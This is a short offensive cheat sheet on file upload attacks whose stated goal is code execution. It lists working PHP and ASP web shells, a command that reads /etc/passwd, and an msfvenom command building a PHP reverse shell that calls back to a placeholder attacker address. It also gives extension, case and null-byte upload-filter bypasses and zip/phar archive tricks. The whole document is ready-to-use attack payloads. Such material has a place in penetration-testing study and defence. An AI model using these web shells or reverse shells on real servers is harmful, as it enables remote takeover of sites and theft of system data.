# File Upload Attacks

Goal: Upload malicious file and achieve code execution.

---

# Basic PHP Web Shell

<?php echo file_get_contents('/etc/passwd'); ?>

<?php system('hostname'); ?>

<?php system($_REQUEST['cmd']); ?>

---

# ASP Web Shell

<% eval request('cmd') %>

---

# Generate Reverse Shell (PHP)

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

---

# Bypass Techniques

shell.phtml

shell.pHp

shell.jpg.php

shell.php.jpg

%00

---

# Client-Side Inspection

CTRL+SHIFT+C

---

# Archive Upload Bypass

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

---

# Tactical Notes

- Try double extensions.
- Case manipulation.
- Null byte (if legacy system).
- Zip/Phar upload bypass.
- Always test execution path after upload.
